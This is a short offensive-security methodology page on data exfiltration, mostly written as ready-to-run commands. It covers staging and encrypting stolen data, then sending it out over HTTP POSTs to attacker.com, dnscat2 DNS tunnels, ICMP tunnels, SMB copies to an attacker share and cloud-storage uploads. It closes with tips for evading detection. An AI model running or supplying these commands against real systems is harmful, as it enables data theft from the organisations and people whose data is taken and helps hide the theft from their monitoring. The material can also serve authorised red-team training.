---
title: Exfiltration
category: methodology
tags: [exfiltration, data-theft, covert-channels]
last_updated: 2025-12-27
---

# Exfiltration

## Overview

Data exfiltration is the unauthorized transfer of data from a target system. This phase requires careful planning to avoid detection by security monitoring tools.

**Key Considerations:**
- Data sensitivity classification
- Network monitoring capabilities
- Bandwidth limitations
- Covert channel requirements

---

## Data Staging

### Compression and Archiving

```bash
# Linux - Create compressed archive
tar czf data.tar.gz /path/to/data
zip -r data.zip /path/to/data

# Windows - PowerShell
Compress-Archive -Path C:\data -DestinationPath C:\data.zip

# Split large files
split -b 10M data.tar.gz data_part_
```

### Encryption Before Transfer

```bash
# OpenSSL encryption
openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.enc -k password

# GPG encryption
gpg -c --cipher-algo AES256 data.tar.gz
```

---

## Transfer Methods

### HTTP/HTTPS

```bash
# Python HTTP server (attacker)
python3 -m http.server 8080

# cURL upload
curl -X POST -F "file=@data.zip" http://attacker.com/upload

# PowerShell upload
Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -InFile data.zip
```

### DNS Tunneling

```bash
# Using dnscat2 (attacker server)
dnscat2 --dns server=attacker.com

# Encode data in DNS queries
# Data is encoded in subdomain labels
# Limited to ~250 bytes per query
```

### ICMP Tunneling

```bash
# Using icmpsh (attacker)
python icmpsh_m.py <attacker_ip> <target_ip>

# Using ptunnel
ptunnel -p <proxy_host> -lp 8000 -da <destination> -dp 22
```

### SMB Exfiltration

```bash
# Windows - Copy to SMB share
copy C:\data\secrets.txt \\attacker\share\

# Linux - smbclient
smbclient //attacker/share -U user -c "put data.zip"
```

### Cloud Storage

```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name uploads
```

---

## Covert Channels

| Channel | Bandwidth | Stealth | Detection Difficulty |
|---------|-----------|---------|---------------------|
| DNS | Low | High | Medium |
| ICMP | Low | Medium | Medium |
| HTTP/S | High | Medium | Low |
| HTTPS (TLS) | High | High | High |
| Steganography | Very Low | Very High | Very High |

---

## Detection Evasion

- Use encrypted channels (HTTPS, SSH)
- Mimic normal traffic patterns
- Throttle transfer speeds
- Use allowed protocols/ports
- Transfer during high-traffic periods
